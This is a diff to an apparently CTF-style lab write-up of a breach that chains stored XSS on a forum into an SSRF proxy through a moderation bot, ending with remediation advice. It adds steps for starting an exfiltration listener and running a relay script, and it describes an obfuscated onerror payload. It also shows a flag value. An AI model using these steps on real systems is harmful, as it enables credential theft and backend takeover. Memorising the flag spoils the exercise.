@@ -1,11 +1,12 @@
-# Breach: stored-xss-bot-ssrf (chained stored XSS → SSRF proxy)
+# Breach: stored-xss-bot-ssrf (Gate 3: staff → god — chained stored XSS → SSRF proxy)
 
 **Severity:** Critical
 **Yields a flag:** Yes — `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`
 
 ## Explanation
 
-Chaining the stored XSS (breach `stored-xss-cookie-theft-flag`) with a
+Chaining the stored XSS (breach
+[`stored-xss-cookie-theft-flag`](../07-stored-xss-cookie-theft-flag/)) with a
 *fetch-and-relay* payload turns the server-side moderation bot into an
 **SSRF proxy**. The bot's browser originates from `127.0.0.1` and — unlike a
 direct request — is allowed to read `/internal/config`, which is gated as
@@ -39,6 +40,13 @@ See `ssrf-relay.sh` in this folder:
 ./ssrf-relay.sh http://localhost:4942 cookies_jdoe.txt 127.0.0.1:8888
 ```
 
+Prerequisite: `cookies_jdoe.txt` is the jdoe student session created by the
+login step in `../05-password-reset-token-disclosure/`.
+
+0. Start the listener first:
+   `python3 ../07-stored-xss-cookie-theft-flag/xss-listener.py &` — it binds
+   `0.0.0.0:8888` and logs to `hits.log`; the exfil arrives URL-encoded in
+   `hits.log`.
 1. Posts an `<img onerror>` payload (JS `eval(String.fromCharCode(...))`
    encoded to stay quote-safe in the attribute — the bot does **not**
    execute `<script>` elements) to the thread the bot watches
@@ -60,7 +68,7 @@ See `ssrf-relay.sh` in this folder:
 
 ## Impact
 
-- Flag 6 disclosed.
+- Walkthrough flag 3 disclosed (`FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`).
 - **PocketBase superuser credentials** disclosed → total backend takeover
   (see `../04-pocketbase-superuser-takeover-flag-god` — the breach that
   completes the god transition).
@@ -69,7 +77,8 @@ See `ssrf-relay.sh` in this folder:
 
 - Serve internal config only to trusted *server-side* identities (mTLS,
   unix socket, PB service account) — never to browser-origin requests.
-- Sanitize forum HTML (see `stored-xss-cookie-theft-flag`) — this chain
-  depends on it.
+- Sanitize forum HTML (see
+  [`stored-xss-cookie-theft-flag`](../07-stored-xss-cookie-theft-flag/)) —
+  this chain depends on it.
 - Replace `xml.etree` with `defusedxml` (ticket already filed internally).
 - Rotate `jwt_secret` and PB admin credentials.
